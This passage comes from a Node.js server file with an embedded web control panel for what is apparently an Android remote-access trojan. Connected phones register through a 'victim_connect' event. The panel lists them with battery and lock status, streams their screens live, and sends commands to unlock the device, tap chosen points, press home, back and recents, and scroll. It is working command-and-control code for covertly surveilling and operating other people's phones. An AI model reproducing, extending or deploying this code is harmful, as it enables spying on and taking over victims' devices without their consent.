        }

        function showClickFeedback(screenX, screenY, originalX, originalY) {
            // Show marker
            UIElements.clickMarker.style.left = \`\${screenX}px\`;
            UIElements.clickMarker.style.top = \`\${screenY}px\`;
            UIElements.clickMarker.style.display = 'block';
            
            // Update coordinates display
            UIElements.coordsDisplay.textContent = \`Click: x=\${originalX}, y=\${originalY}\`;
            UIElements.coordsDisplay.style.display = 'block';
            
            // Auto-hide
            setTimeout(() => {
                UIElements.clickMarker.style.display = 'none';
                setTimeout(() => {
                    UIElements.coordsDisplay.style.display = 'none';
                }, 2000);
            }, 1000);
        }

        // AI ELEMENT RENDERING
        function renderAIElements(detectedElements) {
            if (!state.aiDetectionMode || !detectedElements || detectedElements.length === 0) {
                UIElements.aiHighlightOverlay.innerHTML = '';
                return;
            }
            
            UIElements.aiHighlightOverlay.innerHTML = '';
            state.detectedElements = detectedElements;
            
            let appCount = 0;
            let folderCount = 0;
            let uiCount = 0;
            
            detectedElements.forEach((element, index) => {
                if (!element.x || !element.y || !element.width || !element.height) return;
                
                const elementDiv = document.createElement('div');
                elementDiv.className = 'ai-element';
                elementDiv.dataset.index = index;
                
                // Get element info from database
                const elementType = element.type || 'text';
                const elementInfo = appColorDatabase[elementType] || appColorDatabase['text'];
                
                // Scale coordinates for display
                const scaledX = (element.x * state.currentScale.x) + state.currentOffset.x;
                const scaledY = (element.y * state.currentScale.y) + state.currentOffset.y;
                const scaledWidth = element.width * state.currentScale.x;
                const scaledHeight = element.height * state.currentScale.y;
                
                // Set position and size
                elementDiv.style.left = \`\${scaledX}px\`;
                elementDiv.style.top = \`\${scaledY}px\`;
                elementDiv.style.width = \`\${scaledWidth}px\`;
                elementDiv.style.height = \`\${scaledHeight}px\`;
                elementDiv.style.borderColor = elementInfo.borderColor;
                elementDiv.style.background = elementInfo.bgColor;
                
                // Store data
                elementDiv.dataset.x = element.x;
                elementDiv.dataset.y = element.y;
                elementDiv.dataset.width = element.width;
                elementDiv.dataset.height = element.height;
                elementDiv.dataset.type = elementType;
                elementDiv.dataset.text = element.text || '';
                elementDiv.dataset.desc = element.desc || '';
                elementDiv.dataset.className = element.class || '';
                
                // Add label
                const labelDiv = document.createElement('div');
                labelDiv.className = 'ai-element-label';
                labelDiv.style.borderColor = elementInfo.borderColor;
                labelDiv.style.color = elementInfo.borderColor;
                
                const iconDiv = document.createElement('div');
                iconDiv.className = 'ai-element-icon';
                iconDiv.style.background = elementInfo.bgColor;
                iconDiv.textContent = elementInfo.emoji || elementInfo.text;
                
                const textSpan = document.createElement('span');
                const displayText = element.text ? element.text.substring(0, 10) : elementType.replace('app_', '').replace('folder_', '').replace('ui_', '');
                textSpan.textContent = displayText.length > 8 ? displayText.substring(0, 8) + '...' : displayText;
                
                labelDiv.appendChild(iconDiv);
                labelDiv.appendChild(textSpan);
                elementDiv.appendChild(labelDiv);
                
                // Add click handler for element details
                elementDiv.addEventListener('click', function(e) {
                    e.stopPropagation();
                    showElementDetails(element);
                });
                
                UIElements.aiHighlightOverlay.appendChild(elementDiv);
                
                // Count statistics
                if (elementType.startsWith('app_')) appCount++;
                else if (elementType.startsWith('folder_')) folderCount++;
                else if (elementType.startsWith('ui_')) uiCount++;
                else if (elementType === 'button' || elementType === 'input' || elementType === 'checkbox') uiCount++;
            });
            
            // Update AI stats
            const totalElements = detectedElements.length;
            UIElements.aiStats.innerHTML = \`
                🤖 AI Detection<br>
                Apps: \${appCount} | Folders: \${folderCount}<br>
                UI Elements: \${uiCount} | Total: \${totalElements}
            \`;
            UIElements.aiStats.style.display = 'block';
            
            console.log(\`🤖 Rendered \${totalElements} AI elements (\${appCount} apps, \${folderCount} folders, \${uiCount} UI)\`);
        }

        function showElementDetails(element) {
            const elementInfo = appColorDatabase[element.type] || appColorDatabase['text'];
            
            const detailPanel = document.createElement('div');
            detailPanel.className = 'element-detail-panel';
            detailPanel.style.cssText = \`
                position: absolute;
                top: 60px;
                left: 20px;
                background: rgba(30, 30, 30, 0.95);
                border: 2px solid \${elementInfo.borderColor};
                border-radius: 12px;
                padding: 15px;
                width: 250px;
                z-index: 1000;
                box-shadow: 0 10px 30px rgba(0,0,0,0.7);
                backdrop-filter: blur(10px);
            \`;
            
            detailPanel.innerHTML = \`
                <div style="color: \${elementInfo.borderColor}; font-weight: bold; margin-bottom: 10px; font-size: 14px; display: flex; align-items: center; gap: 8px;">
                    <span style="background: \${elementInfo.bgColor}; padding: 3px 8px; border-radius: 5px; color: white;">
                        \${elementInfo.emoji || elementInfo.text}
                    </span>
                    \${elementInfo.name || element.type}
                </div>
                <div style="font-size: 12px; color: #ccc;">
                    <div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">
                        <span style="color: \${elementInfo.borderColor}; font-weight: bold;">Type:</span>
                        <span style="color: #fff;"> \${element.type}</span>
                    </div>
                    \${element.text ? \`
                    <div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">
                        <span style="color: \${elementInfo.borderColor}; font-weight: bold;">Text:</span>
                        <span style="color: #fff;"> \${element.text}</span>
                    </div>\` : ''}
                    <div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">
                        <span style="color: \${elementInfo.borderColor}; font-weight: bold;">Position:</span>
                        <span style="color: #fff;"> \${element.x}, \${element.y}</span>
                    </div>
                    <div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">
                        <span style="color: \${elementInfo.borderColor}; font-weight: bold;">Size:</span>
                        <span style="color: #fff;"> \${element.width} × \${element.height}</span>
                    </div>
                    <button onclick="window.clickElementAt(\${element.x + element.width/2}, \${element.y + element.height/2})" 
                            style="background: \${elementInfo.bgColor}; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; width: 100%;">
                        🎯 Click This Element
                    </button>
                </div>
            \`;
            
            document.body.appendChild(detailPanel);
            
            // Remove existing detail panel
            const existingPanel = document.querySelector('.element-detail-panel');
            if (existingPanel && existingPanel !== detailPanel) {
                existingPanel.remove();
            }
            
            // Auto-hide after 10 seconds
            setTimeout(() => {
                if (detailPanel.parentNode) {
                    detailPanel.remove();
                }
            }, 10000);
        }

        function clickElementAt(x, y) {
            sendClickCommand(x, y, 'ai-element-click');
            showClickFeedback(
                (x * state.currentScale.x) + state.currentOffset.x,
                (y * state.currentScale.y) + state.currentOffset.y,
                x, y
            );
        }

        function toggleAIMode() {
            state.aiDetectionMode = !state.aiDetectionMode;
            UIElements.aiModeBtn.textContent = state.aiDetectionMode ? '🤖 AI DETECTION ON' : '🤖 AI DETECTION OFF';
            UIElements.aiModeBtn.classList.toggle('active', state.aiDetectionMode);
            
            if (!state.aiDetectionMode) {
                UIElements.aiHighlightOverlay.innerHTML = '';
                UIElements.aiStats.style.display = 'none';
                const detailPanel = document.querySelector('.element-detail-panel');
                if (detailPanel) detailPanel.remove();
            } else if (state.detectedElements.length > 0) {
                renderAIElements(state.detectedElements);
            }
            
            console.log(\`🤖 AI Detection \${state.aiDetectionMode ? 'enabled' : 'disabled'}\`);
        }

        function showAppGrid() {
            // Collect unique apps from detected elements
            const apps = new Map();
            state.detectedElements.forEach(element => {
                if (element.type && element.type.startsWith('app_')) {
                    const appType = element.type;
                    if (!apps.has(appType)) {
                        const appInfo = appColorDatabase[appType];
                        if (appInfo) {
                            apps.set(appType, {
                                ...appInfo,
                                element: element
                            });
                        }
                    }
                }
            });
            
            UIElements.appGrid.innerHTML = '<div class="app-grid-header">Quick Actions</div>';
            
            if (apps.size === 0) {
                const noAppsDiv = document.createElement('div');
                noAppsDiv.style.gridColumn = '1 / -1';
                noAppsDiv.style.textAlign = 'center';
                noAppsDiv.style.padding = '20px';
                noAppsDiv.style.color = '#aaa';
                noAppsDiv.textContent = 'No apps detected yet';
                UIElements.appGrid.appendChild(noAppsDiv);
            } else {
                apps.forEach((appInfo, appType) => {
                    const appDiv = document.createElement('div');
                    appDiv.className = 'app-icon';
                    appDiv.style.background = appInfo.bgColor;
                    appDiv.textContent = appInfo.emoji;
                    appDiv.title = appInfo.name;
                    
                    const labelDiv = document.createElement('div');
                    labelDiv.className = 'app-icon-label';
                    labelDiv.textContent = appInfo.name.substring(0, 8);
                    
                    appDiv.appendChild(labelDiv);
                    
                    appDiv.addEventListener('click', () => {
                        if (appInfo.element) {
                            const x = appInfo.element.x + appInfo.element.width / 2;
                            const y = appInfo.element.y + appInfo.element.height / 2;
                            clickElementAt(x, y);
                            UIElements.appGrid.style.display = 'none';
                        }
                    });
                    
                    UIElements.appGrid.appendChild(appDiv);
                });
            }
            
            UIElements.appGrid.style.display = 'grid';
        }

        function calibrateClick() {
            // Reset calibration
            state.calibrationOffset = { x: 0, y: 0 };
            
            UIElements.debugInfo.innerHTML = \`
                🎯 Calibration Mode Active<br>
                Click anywhere to test<br>
                Right-click to adjust (+10 each)<br>
                Shift+Right-click: -10 X<br>
                Ctrl+Right-click: -10 Y<br>
                Current: \${state.calibrationOffset.x}, \${state.calibrationOffset.y}
            \`;
            UIElements.debugInfo.style.display = 'block';
            
            console.log('🔧 Entering calibration mode');
        }

        // SOCKET FUNCTIONS
        function sendCommand(action, payload = {}) {
            if (!state.activeDeviceId) {
                console.warn('No active device selected');
                return;
            }
            
            if (!socket.connected) {
                console.warn('Socket not connected, attempting to reconnect...');
                UIElements.connectionStatusText.textContent = 'Reconnecting...';
                socket.connect();
                
                if (!state.pendingCommands) state.pendingCommands = [];
                state.pendingCommands.push({ action, payload, timestamp: Date.now() });
                return;
            }
            
            const seq = Date.now();
            const commandData = {
                deviceId: state.activeDeviceId,
                action,
                payload: { ...payload, _seq: seq }
            };
            
            console.log(\`📤 Sending \${action} to \${state.activeDeviceId}\`);
            socket.emit('command_to_device', commandData);
        }

        function startLiveStream() {
            if (state.isLiveStreaming) return;
            
            console.log('🚀 Starting live stream');
            state.isLiveStreaming = true;
            UIElements.loadingSpinner.style.display = 'block';
            
            sendCommand('start_live_stream');
            
            UIElements.liveIndicator.classList.add('active');
            UIElements.streamStatus.textContent = 'Stream: ON';
            UIElements.streamStatus.style.color = '#44ff44';
            
            // Setup click handler when image loads
            UIElements.liveScreenImage.onload = function() {
                console.log('🖼️ Image loaded, click handler ready');
                UIElements.loadingSpinner.style.display = 'none';
            };
            
            clearTimeout(state.retryTimeout);
        }

        function stopLiveStream() {
            if (!state.isLiveStreaming) return;
            
            console.log('🛑 Stopping live stream');
            state.isLiveStreaming = false;
            
            sendCommand('stop_live_stream');
            
            UIElements.liveIndicator.classList.remove('active');
            UIElements.streamStatus.textContent = 'Stream: OFF';
            UIElements.streamStatus.style.color = '#ff4444';
            UIElements.loadingSpinner.style.display = 'none';
            
            clearTimeout(state.retryTimeout);
        }

        // DEVICE MANAGEMENT
        function updateDeviceInList(device) {
            if (!device || !device.deviceId) return;
            
            const deviceId = device.deviceId;
            state.devices[deviceId] = { 
                ...state.devices[deviceId], 
                ...device,
                lastUpdated: Date.now(),
                lastSeen: Date.now()
            };
            
            let li = document.getElementById(\`device-\${deviceId}\`);
            if (!li) {
                li = document.createElement('li');
                li.className = 'device';
                li.id = \`device-\${deviceId}\`;
                li.addEventListener('click', () => {
                    if (device.socketId) {
                        console.log(\`📱 Switching to device: \${device.deviceName}\`);
                        state.activeDeviceId = deviceId;
                        UIElements.deviceTitle.textContent = \`\${device.deviceName}\`;
                        UIElements.lockStatus.textContent = \`Lock: \${device.lockType || 'Unknown'}\`;
                        UIElements.lockStatus.style.color = device.lockType === 'locked' ? '#ff4444' : '#44ff44';
                        
                        showView('control-view');
                        
                        // Auto-start live stream after 1 second
                        setTimeout(() => {
                            startLiveStream();
                            setupClickHandler();
                        }, 1000);
                    } else {
                        alert('⚠️ Device is currently offline. Please wait for it to reconnect.');
                    }
                });
                UIElements.deviceList.appendChild(li);
            }
            
            const isOnline = !!device.socketId;
            const batteryLevel = device.battery || 'N/A';
            const batteryColor = batteryLevel < 20 ? '#ff4444' : batteryLevel < 50 ? '#ffaa00' : '#44ff44';
            
            li.innerHTML = \`
                <div style="flex: 1;">
                    <div class="device-name">\${device.deviceName || 'Unknown Device'}</div>
                    <div class="device-info">
                        📱 Android \${device.androidVersion || 'Unknown'} | 
                        🔋 <span style="color: \${batteryColor}">\${batteryLevel}%</span> | 
                        <span style="color: \${isOnline ? '#44ff44' : '#ff4444'}">
                            \${isOnline ? '● Online' : '● Offline'}
                        </span>
                    </div>
                </div>
                <div style="display: flex; align-items: center; gap: 10px;">
                    <span class="lock-badge \${device.lockType !== 'locked' ? 'unlocked' : ''}">
                        \${(device.lockType || 'none').toUpperCase()}
                    </span>
                    <span class="status-dot" style="background-color: \${isOnline ? '#44ff44' : '#ff4444'}; 
                         box-shadow: 0 0 10px \${isOnline ? '#44ff44' : '#ff4444'}">
                    </span>
                </div>
            \`;
        }

        function showView(viewId) {
            UIElements.deviceListView.classList.remove('active');
            UIElements.controlView.classList.remove('active');
            
            document.getElementById(viewId).classList.add('active');
            
            if (viewId === 'device-list-view') {
                stopLiveStream();
                state.activeDeviceId = null;
                UIElements.coordsDisplay.style.display = 'none';
                UIElements.debugInfo.style.display = 'none';
                UIElements.aiStats.style.display = 'none';
                UIElements.appGrid.style.display = 'none';
                const detailPanel = document.querySelector('.element-detail-panel');
                if (detailPanel) detailPanel.remove();
            }
        }

        // SOCKET.IO EVENT HANDLERS
        socket.on('connect', () => {
            console.log('✅ CONNECTED to server');
            state.connectionStartTime = Date.now();
            state.connectionAttempts = 0;
            
            UIElements.connectionDot.className = 'connection-dot connected';
            UIElements.connectionStatusText.textContent = 'Connected';
            UIElements.connectionStatusText.style.color = '#44ff44';
            
            socket.emit('admin_join');
            console.log('👑 Joined as admin');
        });

        socket.on('disconnect', (reason) => {
            console.warn('❌ DISCONNECTED from server. Reason:', reason);
            
            UIElements.connectionDot.className = 'connection-dot disconnected';
            UIElements.connectionStatusText.textContent = \`Disconnected: \${reason}\`;
            UIElements.connectionStatusText.style.color = '#ff4444';
            
            state.connectionAttempts++;
            
            setTimeout(() => {
                if (!socket.connected) {
                    console.log('🔄 Attempting to reconnect...');
                    socket.connect();
                }
            }, 2000);
        });

        socket.on('connect_error', (error) => {
            console.error('🔌 Connection error:', error.message);
            UIElements.connectionStatusText.textContent = \`Error: \${error.message}\`;
            UIElements.connectionStatusText.style.color = '#ffaa00';
        });

        socket.on('reconnect', (attemptNumber) => {
            console.log(\`🔄 RECONNECTED after \${attemptNumber} attempts\`);
            UIElements.connectionStatusText.textContent = 'Reconnected ✓';
            UIElements.connectionStatusText.style.color = '#44ff44';
        });

        // DEVICE DATA HANDLERS
        socket.on('device_list', (initialDevices) => {
            console.log(\`📋 Received \${initialDevices.length} devices\`);
            UIElements.deviceList.innerHTML = '';
            state.devices = {};
            
            initialDevices.forEach(device => {
                if (device && device.deviceId) {
                    updateDeviceInList(device);
                }
            });
        });

        socket.on('new_device_joined', (device) => {
            console.log(\`➕ New device joined: \${device.deviceName}\`);
            updateDeviceInList(device);
        });

        socket.on('device_disconnected', (deviceId) => {
            console.log(\`➖ Device disconnected: \${deviceId}\`);
            const el = document.getElementById(\`device-\${deviceId}\`);
            if (el) {
                el.querySelector('.status-dot').style.backgroundColor = '#ff4444';
            }
            
            if (state.devices[deviceId]) {
                state.devices[deviceId].socketId = null;
            }
            
            if (state.activeDeviceId === deviceId) {
                alert('⚠️ Device disconnected. It will reconnect automatically.');
                stopLiveStream();
            }
        });

        socket.on('device_heartbeat', (data) => {
            if (data && data.deviceId && state.devices[data.deviceId]) {
                updateDeviceInList({...state.devices[data.deviceId], ...data});
                
                if (data.deviceId === state.activeDeviceId) {
                    UIElements.lockStatus.textContent = \`Lock: \${data.lockType || 'Unknown'}\`;
                    UIElements.lockStatus.style.color = data.lockType === 'locked' ? '#ff4444' : '#44ff44';
                }
            }
        });

        socket.on('live_screen', (data) => {
            if (!data || !data.liveImage) return;
            
            if (data.deviceId !== state.activeDeviceId || !state.isLiveStreaming) return;
            
            // Update last seen
            if (state.devices[data.deviceId]) {
                state.devices[data.deviceId].lastSeen = Date.now();
            }
            
            // Store screen dimensions
            if (data.screenWidth && data.screenHeight) {
                state.screenDimensions.width = data.screenWidth;
                state.screenDimensions.height = data.screenHeight;
            }
            
            // Update screen image
            UIElements.liveScreenImage.src = \`data:image/jpeg;base64,\${data.liveImage}\`;
            
            // Update alt text with dimensions
            UIElements.liveScreenImage.alt = \`Live Screen - \${state.screenDimensions.width}x\${state.screenDimensions.height}\`;
            
            // Store image data
            state.currentImageData = data;
            
            // Setup click handler if not already done
            if (!state.clickHandlerSetup) {
                setupClickHandler();
                state.clickHandlerSetup = true;
            }
            
            // Process AI detected elements
            if (data.detectedElements && state.aiDetectionMode) {
                renderAIElements(data.detectedElements);
            } else if (state.aiDetectionMode) {
                UIElements.aiStats.innerHTML = '🤖 No AI data received';
                UIElements.aiStats.style.display = 'block';
            }
            
            UIElements.loadingSpinner.style.display = 'none';
        });

        // UI EVENT LISTENERS
        UIElements.backToListBtn.onclick = () => {
            console.log('← Going back to device list');
            showView('device-list-view');
        };

        UIElements.liveScreenBtn.onclick = () => {
            if (!state.isLiveStreaming) {
                startLiveStream();
            } else {
                stopLiveStream();
            }
        };

        UIElements.aiModeBtn.onclick = toggleAIMode;
        UIElements.appGridBtn.onclick = showAppGrid;
        UIElements.calibrateBtn.onclick = calibrateClick;
        UIElements.refreshAIBtn.onclick = () => {
            if (state.currentImageData && state.currentImageData.detectedElements) {
                renderAIElements(state.currentImageData.detectedElements);
                console.log('🔍 Refreshed AI elements');
            }
        };

        // CONTROL BUTTONS
        document.getElementById('btn-start-stream').onclick = startLiveStream;
        document.getElementById('btn-stop-stream').onclick = stopLiveStream;
        document.getElementById('btn-wake-unlock').onclick = () => sendCommand('unlock_device');
        document.getElementById('btn-back').onclick = () => sendCommand('global_action', { action: 'back' });
        document.getElementById('btn-home').onclick = () => sendCommand('global_action', { action: 'home' });
        document.getElementById('btn-recents').onclick = () => sendCommand('global_action', { action: 'recents' });
        document.getElementById('btn-scroll-up').onclick = () => sendCommand('scroll_action', { direction: 'up' });
        document.getElementById('btn-scroll-down').onclick = () => sendCommand('scroll_action', { direction: 'down' });
        document.getElementById('btn-scroll-left').onclick = () => sendCommand('scroll_action', { direction: 'left' });
        document.getElementById('btn-scroll-right').onclick = () => sendCommand('scroll_action', { direction: 'right' });

        // KEYBOARD SHORTCUTS
        document.addEventListener('keydown', (e) => {
            if (!state.isLiveStreaming) return;
            
            switch(e.key) {
                case 'a':
                case 'A':
                    if (e.ctrlKey) toggleAIMode();
                    break;
                case 'c':
                case 'C':
                    if (e.ctrlKey) calibrateClick();
                    break;
                case 'g':
                case 'G':
                    if (e.ctrlKey) showAppGrid();
                    break;
                case 'Escape':
                    UIElements.appGrid.style.display = 'none';
                    const detailPanel = document.querySelector('.element-detail-panel');
                    if (detailPanel) detailPanel.remove();
                    UIElements.debugInfo.style.display = 'none';
                    break;
                case 'd':
                case 'D':
                    if (e.ctrlKey) {
                        state.debugMode = !state.debugMode;
                        console.log(\`🐛 Debug mode \${state.debugMode ? 'enabled' : 'disabled'}\`);
                    }
                    break;
            }
        });

        // PERIODIC UPDATES
        setInterval(() => {
            if (socket.connected) {
                const uptime = Math.floor((Date.now() - state.connectionStartTime) / 1000);
                const hours = Math.floor(uptime / 3600);
                const minutes = Math.floor((uptime % 3600) / 60);
                const seconds = uptime % 60;
                
                UIElements.connectionStats.textContent = 
                    \`Uptime: \${hours}h \${minutes}m \${seconds}s | Devices: \${Object.keys(state.devices).length}\`;
            }
        }, 1000);

        // INITIALIZE
        console.log('🚀 AI Enhanced Screen Control Panel Initialized');
        UIElements.connectionStatusText.textContent = 'Connecting to server...';

        // Auto-connect
        if (!socket.connected) {
            socket.connect();
        }

        // Make functions globally available
        window.clickElementAt = clickElementAt;
        window.toggleAIMode = toggleAIMode;
        window.showElementDetails = showElementDetails;

    </script>
</body>
</html>
`;

// MAIN SERVER CODE
app.get('/', (req, res) => {
    res.send(HTML_PANEL);
});

// Socket.IO connection handling
io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Admin joins
    socket.on('admin_join', () => {
        console.log('Admin joined:', socket.id);
        admins.set(socket.id, { socket, type: 'admin' });
        
        // Send current device list to admin
        const deviceList = Array.from(devices.values()).map(device => ({
            deviceId: device.deviceId,
            deviceName: device.deviceName,
            androidVersion: device.androidVersion,
            battery: device.battery,
            lockType: device.lockType,
            socketId: device.socket.id,
            lastSeen: device.lastSeen
        }));
        
        socket.emit('device_list', deviceList);
    });

    // Device joins
    socket.on('victim_connect', (deviceInfo) => {
        console.log('Device connected:', deviceInfo.deviceId);
        
        devices.set(deviceInfo.deviceId, {
            ...deviceInfo,
            socket: socket,
            lastSeen: Date.now(),
            isOnline: true
        });

        // Notify all admins
        admins.forEach((admin, adminId) => {
            if (io.sockets.sockets.get(adminId)?.connected) {
                io.to(adminId).emit('new_device_joined', {
                    ...deviceInfo,
                    socketId: socket.id
                });
            }
        });
    });

    // Device heartbeat
    socket.on('heartbeat', (data) => {
        if (data.deviceId && devices.has(data.deviceId)) {
            const device = devices.get(data.deviceId);
            device.lastSeen = Date.now();
            device.battery = data.battery;
            device.lockType = data.lockType;
            
            // Notify admins
            admins.forEach((admin, adminId) => {
                if (io.sockets.sockets.get(adminId)?.connected) {
                    io.to(adminId).emit('device_heartbeat', {
                        deviceId: data.deviceId,
                        battery: data.battery,
                        lockType: data.lockType
                    });
                }
            });
        }
    });

    // Screen data from device
    socket.on('screen_data', (data) => {
        // Broadcast to all admins
        admins.forEach((admin, adminId) => {
            if (io.sockets.sockets.get(adminId)?.connected) {
                io.to(adminId).emit('screen_data', data);
            }
        });
    });

    // Live screen stream from device
    socket.on('live_screen', (data) => {
        // Broadcast to all admins
        admins.forEach((admin, adminId) => {
            if (io.sockets.sockets.get(adminId)?.connected) {
                io.to(adminId).emit('live_screen', data);
            }
        });
    });

    // Commands from admin to device
    socket.on('command_to_device', (data) => {
        const { deviceId, action, payload } = data;
        
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            if (device.socket.connected) {
                device.socket.emit(action, payload);
                console.log(`Command sent to ${deviceId}: ${action}`);
            } else {
                console.log(`Device ${deviceId} not connected`);
                socket.emit('command_error', { deviceId, error: 'Device not connected' });
            }
        } else {
            console.log(`Device ${deviceId} not found`);
            socket.emit('command_error', { deviceId, error: 'Device not found' });
        }
    });

    // Device disconnect
    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        
        // Check if it was a device
        let disconnectedDeviceId = null;
        for (const [deviceId, device] of devices.entries()) {
            if (device.socket.id === socket.id) {
                disconnectedDeviceId = deviceId;
                break;
            }
        }
        
        if (disconnectedDeviceId) {
            devices.delete(disconnectedDeviceId);
            
            // Notify admins
            admins.forEach((admin, adminId) => {
                if (io.sockets.sockets.get(adminId)?.connected) {
                    io.to(adminId).emit('device_disconnected', disconnectedDeviceId);
                }
            });
            
            console.log(`Device ${disconnectedDeviceId} removed`);
        }
        
        // Check if it was an admin
        if (admins.has(socket.id)) {
            admins.delete(socket.id);
            console.log('Admin removed:', socket.id);
        }
    });
});

// Cleanup disconnected devices periodically
setInterval(() => {
    const now = Date.now();
    const timeout = 30000; // 30 seconds
    
    for (const [deviceId, device] of devices.entries()) {
        if (now - device.lastSeen > timeout) {
            console.log(`Removing inactive device: ${deviceId}`);
            devices.delete(deviceId);
            
            // Notify admins
            admins.forEach((admin, adminId) => {
                if (io.sockets.sockets.get(adminId)?.connected) {
                    io.to(adminId).emit('device_disconnected', deviceId);
                }
            });
        }
    }
}, 10000);

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Open http://localhost:${PORT} in your browser`);
});
